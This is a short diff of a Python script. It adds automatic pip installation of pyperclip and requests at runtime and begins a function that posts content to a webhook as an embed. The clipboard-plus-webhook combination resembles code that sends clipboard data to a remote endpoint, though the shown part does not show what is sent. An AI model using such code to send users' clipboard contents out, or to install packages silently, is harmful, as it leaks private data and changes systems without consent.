@@ -1,6 +1,18 @@
-import pyperclip
-import requests
+import subprocess
+import sys
 import json
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+try:
+    import pyperclip
+except ImportError:
+    install('pyperclip')
+    import pyperclip
+try:
+    import requests
+except ImportError:
+    install('requests')
+    import requests
 def send_to_webhook(content):
     embed = {
         "description": content,
